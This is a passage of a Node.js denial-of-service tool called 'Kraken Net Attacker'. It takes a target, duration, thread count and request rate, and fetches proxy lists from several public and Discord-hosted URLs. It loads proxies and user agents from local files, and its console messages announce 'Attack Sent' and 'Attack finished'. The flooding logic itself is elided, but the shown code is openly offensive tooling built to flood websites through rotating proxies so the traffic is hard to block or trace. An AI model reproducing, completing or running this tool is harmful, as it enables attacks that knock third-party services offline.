...
setTitle('Kraken Net Attacker');
const prompt = require("prompt-sync")();

if (process.argv.length < 6){
    console.log('Only HTTPS')
    console.log('node k.js [Target] [Time] [Threads] [Requests Per IP]');
    process.exit(0);
}
...
const http_web_list = [
    ...
    "https://api.proxyscrape.com?request=displayproxies&proxytype=http&anonymity=all&ssl=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://www.proxyscan.io/download?type=http",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "http://k2ysarchive.xyz/proxy/http.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
    "https://cdn.discordapp.com/attachments/1024968990877032481/1036170442219737148/HTTP.txt",
    "https://cdn.discordapp.com/attachments/1024968990877032481/1036170815722504202/HTTP.txt",
    "https://ipstresser.pro/prox13/proxies.txt",
    "http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http"
]
var hey = http_web_list;
var list = [];
(async()=>{
    if (hey) {
        console.log(`Proxy `)
...
const target = process.argv[2], time = process.argv[3], thread = process.argv[4], rate = process.argv[5];
proxys = fs.readFileSync('HTTP.txt', 'utf-8').toString().match(/\S+/g);
uas = fs.readFileSync('ua.txt', 'utf-8').toString().match(/\S+/g);
...
const dateObj = new Date();
    ...
    console.clear();
    console.log(`[success] Attack Sent `)
	console.log(`cancel attack Ctrl + C `)
	console.log(`Tools By ZeroZeroID `)
	console.log(``)
    ...
    setTimeout(() => {
        console.log(`[success]Attack finished`);
        process.exit(-1);
    }, process.argv[3] * 1000);
